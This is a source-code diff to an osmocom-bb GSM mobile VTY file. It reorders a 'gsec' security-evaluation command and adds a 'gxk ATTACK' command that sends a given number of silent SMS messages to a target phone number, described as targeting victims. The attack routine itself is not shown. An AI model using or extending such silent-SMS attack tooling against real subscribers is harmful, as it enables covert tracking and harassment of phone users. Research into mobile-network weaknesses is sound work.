@@ -1310,12 +1310,52 @@ DEFUN(cfg_no_ms, cfg_no_ms_cmd, "no ms MS_NAME",
 	return CMD_SUCCESS;
 }
 
-DEFUN(gsec, gsec_cmd, "gsec [MSNAME] (SCAN|REPORT|CRACK) MSISDN Testcase1 Testcase2 Testcase3 Testcase4 Testcase5",
+DEFUN(gsec_attack, gsec_attack_cmd, "gxk ATTACK [MSNAME] MSISDN NUMBER_OF_MESSAGES",
 	"Perform an Security evaluation of the current ARFCN \n"
+	"ATTACK to target victims \n"
 	"Name of MS (see \"show ms\") \n"
+	"Cellphone number \n"	
+	"Number of messages to send \n")
+{
+	struct osmocom_ms *ms;
+	ms = get_ms(argv[1], vty);
+	
+	/*
+		Requirements 
+		(+ Registered in the Network)
+		(+ Start Stats Module)
+		(- Check if argv[1] is actual a valid number)
+	*/
+	if (!ms){
+		return CMD_WARNING;
+	}else{
+		gsec_ms = ms;
+		gsec_number = argv[2];
+		gsec_vty = vty;
+	}
+
+	/*
+		Parsing and calling
+	*/
+	if(argc>3 && (argv[0][0] == 'A')){
+		// ATTACK MODE
+		int n_messages = atoi(argv[3]);
+		attack_silentsms.chain_messages = n_messages;
+		vty_out(vty, "[GXK][*] Silent-SMS Targeting MSISDN %s (%d) %s", gsec_number, n_messages , VTY_NEWLINE);
+		execute_attack_1();
+	} else {
+		return CMD_ERR_NO_MATCH;
+	}
+	
+	return CMD_SUCCESS;
+}
+
+
+DEFUN(gsec, gsec_cmd, "gsec (SCAN|REPORT) [MSNAME] MSISDN Testcase1 Testcase2 Testcase3 Testcase4 Testcase5",
+	"Perform an Security evaluation of the current ARFCN \n"
 	"SCAN to perform test cases \n"
 	"REPORT to check the stats \n"
-	"CRACK to print keystream \n"
+	"Name of MS (see \"show ms\") \n"
 	"Cellphone number \n"
 	"1 to test Silent SMS and check for frequency Hopping, 0 to skip \n"
 	"1 to test A5/(0|1|2|3) Support, 0 to skip \n"
@@ -1324,7 +1364,7 @@ DEFUN(gsec, gsec_cmd, "gsec [MSNAME] (SCAN|REPORT|CRACK) MSISDN Testcase1 Testca
 	"1 to test for KRAKEN Requirements, 0 to skip \n")
 {
 	struct osmocom_ms *ms;
-	ms = get_ms(argv[0], vty);
+	ms = get_ms(argv[1], vty);
 	
 	/*
 		Requirements 
@@ -1344,11 +1384,11 @@ DEFUN(gsec, gsec_cmd, "gsec [MSNAME] (SCAN|REPORT|CRACK) MSISDN Testcase1 Testca
 	/*
 		Parsing and calling
 	*/
-
-	if(argc>1 && (argv[1][0] == 'R')){
+	
+	if(argc>1 && (argv[0][0] == 'R')){
 		// REPORT MODE 
 		aux_checkstats_report();
-	} else if(argv[1][0] == 'S' && argc>6){
+	} else if(argv[0][0] == 'S' && argc>6){
 		// SCAN MODE
 		if(atoi(argv[3])){
 			vty_out(vty, "[GSEC][*] Testing for Silent SMS and Frequency Hopping %s", VTY_NEWLINE);
@@ -2901,6 +2941,7 @@ int ms_vty_init(void)
 	install_element(ENABLE_NODE, &test_reselection_cmd);
 	install_element(ENABLE_NODE, &delete_forbidden_plmn_cmd);
 	install_element(ENABLE_NODE, &gsec_cmd);
+	install_element(ENABLE_NODE, &gsec_attack_cmd);
 
 #ifdef _HAVE_GPSD
 	install_element(CONFIG_NODE, &cfg_gps_host_cmd);
